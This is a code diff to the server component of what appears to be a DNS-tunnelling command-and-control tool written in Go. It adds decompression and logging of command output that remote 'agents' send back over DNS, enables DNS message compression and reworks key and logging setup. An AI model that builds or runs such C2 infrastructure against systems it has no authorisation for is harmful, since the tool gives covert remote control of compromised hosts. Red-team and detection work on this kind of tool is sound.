@@ -2,9 +2,11 @@ package server
 
 import (
 	"bytes"
+	"compress/gzip"
 	"encoding/binary"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"math"
 	"os"
 	"strings"
@@ -130,6 +132,20 @@ func SendFileToAgent(payload []byte, firstPacket c2.MessagePacketWithSignature) 
 	return nil
 }
 
+// shows the output of any command run by agent and sent back to us.
+func displayCommandResult(fullPayload []byte) {
+	// probably should save this in a temp file rather than log. //todo
+	if len(fullPayload) > conf.CompressionThreshold {
+		rdata := bytes.NewReader(bytes.Trim(fullPayload, "\x00"))
+		r, _ := gzip.NewReader(rdata)
+		s, _ := ioutil.ReadAll(r)
+		log.Info("showing decompressed result") //todo:remove
+		log.Warn(string(s))
+	} else {
+		log.Warnf(string(bytes.Trim(fullPayload, "\x00")))
+	}
+}
+
 func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
 	_, ok := ConnectedAgents[Packet.Signature.String()]
 	if !ok {
@@ -153,7 +169,7 @@ func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 		ConnectedAgents[Packet.Signature.String()] = agent
 		payload = []byte("Ack! Last Part")
 	}
-	log.Infof("sending plyload %#v\n", msg)
+	// log.Infof("sending plyload %#v\n", msg)
 	// time.Sleep(2 * time.Second)
 	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
 	for _, A := range Answers {
@@ -177,8 +193,7 @@ func HandleRunCommandResFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 	// todo: clean the memory for this parentpartID
 	// delete(ServerPacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
 	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
-	// probably should save this in a temp file rather than log. //todo
-	log.Warnf(string(bytes.Trim(fullPayload, "\x00")))
+	displayCommandResult(fullPayload)
 	// remove the buffer from memory
 	delete(ServerPacketBuffersWithSignature, int(Packet.Msg.ParentPartID))
 	return nil
@@ -331,7 +346,7 @@ func parseQuery(m *dns.Msg) error {
 func handle53(w dns.ResponseWriter, r *dns.Msg) {
 	m := new(dns.Msg)
 	m.SetReply(r)
-	m.Compress = false
+	m.Compress = true
 
 	switch r.Opcode {
 	case dns.OpcodeQuery:
@@ -356,21 +371,6 @@ func runDns(cmd *cobra.Command) {
 
 }
 
-func updater() {
-	timeticker := time.NewTicker(1 * time.Second)
-	idleAgentRemovalTicker := time.NewTicker(60 * time.Second)
-	// runCmdTicker := time.NewTicker(30 * time.Second)
-	for {
-		select {
-		case <-timeticker.C:
-			UiRoot.Draw()
-
-		case <-idleAgentRemovalTicker.C:
-			RemoveIdleAgents()
-		}
-	}
-}
-
 func RunServer(cmd *cobra.Command, args []string) {
 	// set global flag that we're running as server
 	conf.Mode = conf.RunAsServer
@@ -383,15 +383,17 @@ func RunServer(cmd *cobra.Command, args []string) {
 		}
 		mw := io.MultiWriter(UiLog, f)
 		log.SetOutput(mw)
+	} else {
+		log.SetOutput(UiLog)
 	}
 
 	var err error
 	conf.GlobalServerConfig.ListenAddress, err = cmd.Flags().GetString("listenAddress")
 	errorHandler(err)
 
-	conf.GlobalServerConfig.PrivateKeyB32, err = cmd.Flags().GetString("privateKey")
+	conf.GlobalServerConfig.PrivateKeyBasexx, err = cmd.Flags().GetString("privateKey")
 	errorHandler(err)
-	conf.GlobalServerConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalServerConfig.PrivateKeyB32)
+	conf.GlobalServerConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalServerConfig.PrivateKeyBasexx)
 	errorHandler(err)
 
 	// todo: public keys
@@ -407,6 +409,6 @@ func RunServer(cmd *cobra.Command, args []string) {
 	conf.GlobalServerConfig.DnsSuffix = dnsSuffix
 
 	go runDns(cmd)
-	go updater()
 	RunTui()
+
 }
